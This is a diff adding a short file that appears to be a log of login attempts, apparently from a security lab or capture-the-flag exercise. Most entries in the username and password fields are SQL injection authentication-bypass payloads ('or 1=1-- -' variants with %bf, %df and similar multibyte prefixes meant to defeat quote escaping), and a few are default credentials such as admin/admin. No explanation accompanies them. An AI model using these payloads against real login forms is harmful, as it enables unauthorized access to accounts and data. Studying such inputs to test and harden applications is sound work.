@@ -1,0 +1,30 @@
+User Name:1Password:
+User Name:1Password:1
+User Name:adminPassword:admin
+User Name:adminPassword:admin
+User Name:' or 1=1-- -Password:
+User Name:%bf' or 1=1 -- -Password:
+User Name:%bf" or 1=1-- -Password:
+User Name:%bf' or 1=1-- -Password:
+User Name:adminPassword:%bf' or 1=1-- -
+User Name:%df' or 1=1-- -Password:
+User Name:%bf' or 1=1#Password:
+User Name:%bf' or 1=1-- -Password:
+User Name:adminPassword:admin
+User Name:'' or 1=1-- -Password:admin
+User Name:%bfPassword:
+User Name:%bf'Password:
+User Name:%bf'or1=1-- -Password:
+User Name:%bf' or 1=1-- -Password:
+User Name:%bf' or 1=1-- -Password:
+User Name:%af' or 1=1-- -Password:
+User Name:%ef' or 1=1-- -Password:
+User Name:%ef%27 or 1=1-- -Password:
+User Name:%bf%27 or 1=1-- -Password:
+User Name:%bf%27 or 1=1-- -Password:%bf%27 or 1=1-- -
+User Name:%bf' or 1=1-- -Password:
+User Name:%bf' or 1=1-- -Password:
+User Name:%bf' or 1=1#Password:
+User Name:%bf' or 1=1-- -Password:
+User Name:�' or 1=1#Password:
+User Name:�' or 1=1-- -Password:
